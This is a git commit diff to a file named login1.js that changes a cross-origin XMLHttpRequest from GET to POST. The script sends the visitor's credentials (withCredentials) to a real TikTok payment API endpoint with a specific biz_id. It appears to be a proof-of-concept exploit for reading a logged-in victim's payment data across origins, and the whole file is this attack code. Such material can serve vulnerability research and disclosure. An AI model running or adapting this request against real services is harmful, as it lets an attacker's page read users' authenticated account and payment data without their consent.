095a82fffd07c41624a00ed6f8e0bb46777fd9af
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-31 12:05:39 +0700

    Update login1.js

--- login1.js
+++ login1.js
@@ -1,6 +1,6 @@
 var xhr = new XMLHttpRequest();
 xhr.onload = reqListener; 
-xhr.open("GET", "https://fp.us.tiktokv.com/pipo_fe/checkout/payment_api/payment/v1/get_payment_result?biz_id=ARMAAEoZjpPDfU8EurijAeigjgoL");
+xhr.open("POST", "https://fp.us.tiktokv.com/pipo_fe/checkout/payment_api/payment/v1/get_payment_result?biz_id=ARMAAEoZjpPDfU8EurijAeigjgoL");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.send();
